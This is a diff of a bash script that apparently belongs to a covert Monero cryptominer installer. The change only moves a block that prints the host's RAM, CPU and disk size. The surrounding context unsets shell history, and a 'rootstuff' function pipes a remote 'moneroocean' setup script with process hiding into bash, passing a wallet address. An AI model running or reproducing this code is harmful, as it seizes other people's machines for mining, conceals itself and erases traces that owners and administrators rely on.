@@ -4,8 +4,6 @@ unset HISTFILE
 #unset HISTFILE ;history -d $((HISTCMD-2))
 #export HISTFILE=/dev/null ;history -d $((HISTCMD-2))
 
-echo -e "---------------------------------\n|     Resource     |     Value     |\n---------------------------------"; echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"; echo -e "|   CPU Cores    |      $(nproc)      |"; echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"; echo -e "---------------------------------"
-
 # Function to check if a service is running
 is_service_running() {
     service="$1"
@@ -25,6 +23,8 @@ done
 
 # If script reaches here, no service is running
 echo "No specified services are running. Continuing with the script..."
+
+echo -e "---------------------------------\n|     Resource     |     Value     |\n---------------------------------"; echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"; echo -e "|   CPU Cores    |      $(nproc)      |"; echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"; echo -e "---------------------------------"
 
 rootstuff(){
   curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
